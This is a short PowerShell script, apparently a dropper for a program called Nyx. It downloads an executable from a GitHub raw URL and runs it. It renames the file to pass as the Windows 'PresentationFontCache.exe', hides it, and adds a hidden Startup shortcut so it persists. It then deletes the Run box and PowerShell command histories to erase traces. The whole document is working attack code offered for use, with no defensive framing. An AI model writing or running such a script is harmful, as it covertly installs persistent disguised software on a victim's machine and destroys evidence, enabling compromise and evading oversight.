#Nyx - 20230220-01

# Download and run Nyx.exe
Invoke-WebRequest https://raw.githubusercontent.com/VVolfCZ/ProjectNyx/main/Nyx.exe -OutFile "$env:TEMP\Nyx.exe"
& "$env:TEMP\Nyx.exe"

# Change Nyx Name
Rename-Item -Path "$env:TEMP\Nyx.exe" -NewName "PresentationFontCache.exe"

# Hide Nyx
$FILE=Get-Item "$env:TEMP\PresentationFontCache.exe" -Force
$FILE.attributes='Hidden'

# Create Nyx shortcut in Startup
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Nyx.lnk")
$Shortcut.TargetPath = "$env:TEMP\PresentationFontCache.exe"
$Shortcut.Save()

# Hide Nyx Shortcut
$FILE=Get-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Nyx.lnk" -Force
$FILE.attributes='Hidden'

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
